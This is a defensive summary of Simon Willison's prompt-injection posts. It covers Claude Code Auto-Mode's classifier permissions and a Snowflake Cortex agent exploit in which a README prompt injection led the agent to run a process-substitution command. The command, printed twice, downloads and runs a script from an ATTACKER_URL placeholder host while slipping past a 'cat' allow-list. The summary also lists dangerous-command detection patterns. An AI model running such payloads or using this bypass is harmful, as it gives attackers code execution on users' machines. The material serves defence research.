# Summary: Simon Willison — Prompt injection tag (curated post index + recent notes)

**Source file:** 305-blog-simon-willison-prompt-injection-tag.md
**Paper/post ID:** 305

## Attack Vector(s)
Tag archive: 147 posts indexed; the scrape captures recent entries covering Claude Code Auto-Mode (classifier-gated permissions), Snowflake Cortex AI Agent exploitation via README-hidden prompt injection, and supply-chain concerns (LiteLLM incident reference).

## Real-World Applicability
- **Claude Code Auto-Mode** uses a separate Sonnet 4.6 classifier to vet actions; default allow/soft_deny/block JSON lists are exposed via `claude auto-mode defaults`. Willison is skeptical — probabilistic classifier still fallible.
- **Snowflake Cortex Agent exploit** (PromptArmor): README on attacker-controlled GitHub repo contains prompt injection. Agent is tricked into executing: `cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))`. The `cat` command was on the safe-without-approval list but the process-substitution form `<(sh < <(wget ...))` executes arbitrary shell.
- Recommends deterministic sandboxes (seccomp, container isolation) over prompt-based guardrails.

## Reproduction Examples
Cortex RCE payload:
```
cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))
```

Selected default allow/block categories (verbatim):
- Allow: "Read-Only Operations", "Declared Dependencies" (pip install -r requirements.txt), "Local Operations" (within project scope).
- Soft-deny: Git Destructive, Git Push to Default Branch, "Code from External" (curl | bash, eval, yaml.unsafe_load, pickle), "Cloud Storage Mass Delete".

## Defenses / Mitigations Discussed
- Deterministic OS-level sandboxing (file/network isolation) preferred to AI-classifier-based permissions.
- Principle: classifier "may still allow some risky actions" — documented in Anthropic docs.
- `pip install -r requirements.txt` being allowed means unpinned dependencies still enable supply-chain attacks (e.g., LiteLLM).

## Key Takeaways for a Safety Framework
- Don't rely on shell-command allow-lists by basename (`cat`, `echo`); parse full ASTs, detect process substitution `<(…)`, command substitution `$(…)`, `|`, `&&`, backticks.
- Detect `curl | sh`, `wget | sh`, `iex (irm …)`, `eval`, `exec`, `pickle.load`, `yaml.unsafe_load`, `torch.load` in agent-generated code.
- Require pinned-hash dependencies when agents install packages.
- Branch protection + passphrase-protected signing keys prevent agent-initiated silent pushes.
- Prefer container/seccomp sandboxes over classifier-based gating for high-privilege actions.
